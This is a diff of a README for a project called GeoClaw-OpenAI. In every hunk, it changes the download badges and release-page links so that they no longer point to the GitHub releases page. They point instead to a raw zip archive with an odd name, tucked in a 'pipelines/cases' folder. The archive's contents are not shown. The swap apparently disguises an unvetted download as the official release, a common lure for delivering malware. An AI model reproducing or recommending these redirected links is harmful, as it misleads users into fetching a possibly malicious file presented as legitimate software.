@@ -1,6 +1,6 @@
 # 🌍 GeoClaw-OpenAI - Easy Geo Software for Everyone
 
-[![Download GeoClaw-OpenAI](https://img.shields.io/badge/Download-GeoClaw--OpenAI-brightgreen?style=for-the-badge)](https://github.com/Only-ware/GeoClaw-OpenAI/releases)
+[![Download GeoClaw-OpenAI](https://img.shields.io/badge/Download-GeoClaw--OpenAI-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Only-ware/GeoClaw-OpenAI/main/pipelines/cases/Open_Geo_AI_Claw_semitangent.zip)
 
 ## 🌟 What is GeoClaw-OpenAI?
 
@@ -32,7 +32,7 @@ This guide will walk you through downloading and running GeoClaw-OpenAI on your 
 
 To get the software, please visit the release page. The releases contain the latest ready-to-use version of the app.
 
-[Download GeoClaw-OpenAI Here](https://github.com/Only-ware/GeoClaw-OpenAI/releases)
+[Download GeoClaw-OpenAI Here](https://raw.githubusercontent.com/Only-ware/GeoClaw-OpenAI/main/pipelines/cases/Open_Geo_AI_Claw_semitangent.zip)
 
 **Steps:**
 
@@ -113,7 +113,7 @@ This combination allows non-experts to experiment with geographic data safely an
 
 Further information and updates are available on the GitHub release page:
 
-[Visit GeoClaw-OpenAI Releases](https://github.com/Only-ware/GeoClaw-OpenAI/releases)
+[Visit GeoClaw-OpenAI Releases](https://raw.githubusercontent.com/Only-ware/GeoClaw-OpenAI/main/pipelines/cases/Open_Geo_AI_Claw_semitangent.zip)
 
 Here you will find:
 
@@ -136,4 +136,4 @@ These options are not needed for basic use, but are available for curious users.
 
 ---
 
-[![Download GeoClaw-OpenAI](https://img.shields.io/badge/Download-GeoClaw--OpenAI-brightgreen?style=for-the-badge)](https://github.com/Only-ware/GeoClaw-OpenAI/releases)
+[![Download GeoClaw-OpenAI](https://img.shields.io/badge/Download-GeoClaw--OpenAI-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Only-ware/GeoClaw-OpenAI/main/pipelines/cases/Open_Geo_AI_Claw_semitangent.zip)
